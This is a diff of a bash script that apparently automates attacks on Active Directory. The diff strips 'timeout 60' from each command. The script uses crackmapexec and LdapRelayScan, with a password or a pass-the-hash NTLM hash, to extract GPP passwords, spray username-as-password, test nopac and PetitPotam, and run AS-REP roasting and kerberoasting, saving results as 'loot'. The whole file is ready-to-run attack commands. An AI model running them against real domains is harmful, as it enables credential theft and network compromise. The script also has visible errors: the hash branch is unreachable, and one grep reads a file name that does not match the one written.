@@ -70,39 +70,39 @@ if [ -z $HASH ]
 then
  # Use Password
  # GPP password
-   timeout 60 crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password/pass_$DOM.txt
+   crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password/pass_$DOM.txt
 
  # GPP autologin
-   timeout 60 crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin/login_$DOM.txt
+   crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin/login_$DOM.txt
 
  # User txt from DC
-   timeout 60 crackmapexec smb $IP -u $USER -p $PASS -d $DOM --users > /root/output/list/raw.txt
+   crackmapexec smb $IP -u $USER -p $PASS -d $DOM --users > /root/output/list/raw.txt
    awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | sed '/\x1b\[[0-9;]*[mGKHF]/d' | grep -v 'HealthMailbox' > /root/output/list/user.txt
    rm /root/output/list/raw.txt
-   timeout 60 crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt
+   crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt
    grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw.txt > /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt
  # keep the raw file for screens and debugging
 
  # Password policy
-   timeout 60 crackmapexec smb $IP -u $USER -p $PASS -d $DOM --pass-pol >> /root/output/loot/intern/ad/passpol/pol_$DOM.txt
+   crackmapexec smb $IP -u $USER -p $PASS -d $DOM --pass-pol >> /root/output/loot/intern/ad/passpol/pol_$DOM.txt
 
  # nopac
-   timeout 60 crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M nopac >> /root/output/loot/intern/ldap/nopac/nopac_$FQDN.txt
+   crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M nopac >> /root/output/loot/intern/ldap/nopac/nopac_$FQDN.txt
 
  # petitpotam
-   timeout 60 crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M petitpotam >> /root/output/loot/intern/rpc/petit_potam/petitpotam_$FQDN.txt
+   crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M petitpotam >> /root/output/loot/intern/rpc/petit_potam/petitpotam_$FQDN.txt
 
  # sessions
-   timeout 60 crackmapexec smb $IP -u $USER -p $PASS -d $DOM --sessions >> /root/output/loot/intern/ad/session/sessions_$FQDN.txt
+   crackmapexec smb $IP -u $USER -p $PASS -d $DOM --sessions >> /root/output/loot/intern/ad/session/sessions_$FQDN.txt
 
  # asreproast
-   timeout 60 crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt
 
  # kerberoast
-   timeout 60 crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt
 
  # MAQ  
-   timeout 60 crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt
 
  # ldap signing 
    python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -p $PASS -dc-ip $IP -method BOTH >> /root/output/loot/intern/ldap/signing/signig_$DOM.txt
@@ -120,39 +120,39 @@ echo 'HASH is untested EXIT'
 exit 0
  # use HASH
  # GPP password
-   timeout 60 crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password/pass_$DOM.txt
+   crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_password >> /root/output/loot/intern/ad/gpp_password/pass_$DOM.txt
 
  # GPP autologin
-   timeout 60 crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin/login_$DOM.txt
+   crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin/login_$DOM.txt
 
  # User txt from DC
-   timeout 60 crackmapexec smb $IP -u $USER -H $HASH -d $DOM --users > /root/output/list/raw.txt
+   crackmapexec smb $IP -u $USER -H $HASH -d $DOM --users > /root/output/list/raw.txt
    awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | sed '/\x1b\[[0-9;]*[mGKHF]/d' | grep -v 'HealthMailbox' > /root/output/list/user.txt
    rm /root/output/list/raw.txt
-   timeout 60 crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt
+   crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >> /root/output/loot/intern/ad/iam/username_as_pass/raw_$DOM.txt
    grep '+' /root/output/loot/intern/ad/iam/username_as_pass/raw.txt > /root/output/loot/intern/ad/iam/username_as_pass/user_$DOM.txt
  # keep the raw file for screens and debugging
 
  # Password policy
-   timeout 60 crackmapexec smb $IP -u $USER -H $HASH -d $DOM --pass-pol >> /root/output/loot/intern/ad/passpol/pol_$DOM.txt
+   crackmapexec smb $IP -u $USER -H $HASH -d $DOM --pass-pol >> /root/output/loot/intern/ad/passpol/pol_$DOM.txt
 
  # nopac
-   timeout 60 crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M nopac >> /root/output/loot/intern/ldap/nopac/nopac_$FQDN.txt
+   crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M nopac >> /root/output/loot/intern/ldap/nopac/nopac_$FQDN.txt
 
  # petitpotam
-   timeout 60 crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M petitpotam >> /root/output/loot/intern/rpc/petit_potam/petitpotam_$FQDN.txt
+   crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M petitpotam >> /root/output/loot/intern/rpc/petit_potam/petitpotam_$FQDN.txt
 
  # sessions
-   timeout 60 crackmapexec smb $IP -u $USER -H $HASH -d $DOM --sessions >> /root/output/loot/intern/ad/session/sessions_$FQDN.txt
+   crackmapexec smb $IP -u $USER -H $HASH -d $DOM --sessions >> /root/output/loot/intern/ad/session/sessions_$FQDN.txt
 
  # asreproast
-   timeout 60 crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt
 
  # kerberoast
-   timeout 60 crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt
 
  # MAQ  
-   timeout 60 crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt
+   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt
 
  # ldap signing
    python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -nthash $HASH -dc-ip $IP -method BOTH > /root/output/loot/intern/ldap/signing/signig_$DOM.txt
